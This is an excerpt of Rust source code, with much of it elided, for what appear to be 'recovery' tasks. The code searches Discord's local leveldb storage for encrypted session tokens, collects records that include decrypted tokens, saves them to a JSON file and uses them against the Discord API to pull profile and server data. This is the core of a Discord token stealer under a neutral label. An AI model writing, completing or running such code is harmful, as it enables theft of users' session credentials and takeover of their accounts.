...
async fn collect_tokens_for_path(
    ...
    let regex =
        Regex::new(r#"dQw4w9WgXcQ:[^"]+"#).map_err(|err| RecoveryError::Custom(err.to_string()))?;
    ...
    if leveldb_dir.exists() {
        ...
        while let Some(entry) = dir.next_entry().await? {
            ...
            for mat in regex.find_iter(&text) {
                tokens.insert(mat.as_str().to_string());
            }
        }
    }
...
#[derive(Serialize)]
struct DiscordTokenSummary {
    tokens: Vec<DiscordTokenRecord>,
}
...
impl RecoveryTask for DiscordTokenTask {
    ...
    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        ...
        let records = gather_discord_token_records(&self.roots).await?;
        ...
        let artifact = write_json_artifact(
            ...
            &self.label(),
            "discord-tokens.json",
            &DiscordTokenSummary { tokens: records },
        )
        .await?;
...
async fn collect_discord_profiles(
    roots: &[PathBuf],
    api: &DiscordApiClient,
) -> Result<Vec<DiscordProfileRecord>, RecoveryError> {
    let mut profiles = Vec::new();
    let mut seen = HashSet::new();
    let tokens = gather_discord_token_records(roots).await?;
    for record in tokens
        .into_iter()
        .filter_map(|rec| rec.decrypted.map(|token| (rec.source, token)))
    {
...
#[derive(Serialize)]
struct DiscordProfileSummary {
    profiles: Vec<DiscordProfileRecord>,
}
...
impl From<DiscordGuild> for DiscordGuildSummary {
    fn from(source: DiscordGuild) -> Self {
        let features = source.features.unwrap_or_default();
        ...
        Self {
            ...
            discoverable: normalized.iter().any(|flag| flag == "discoverable"),
            vanity_url: normalized.iter().any(|flag| flag == "vanity_url"),
        }
    }
}
...
impl RecoveryTask for DiscordProfileTask {
    ...
    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        ...
        let profiles = collect_discord_profiles(&self.roots, &client).await?;
        ...
        let artifact = write_json_artifact(
            ...
            &DiscordProfileSummary { profiles },
        )
        .await?;
...
impl RecoveryTask for DiscordServiceTask {
    ...
    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        ...
        let profiles = collect_discord_profiles(&self.roots, &api).await?;
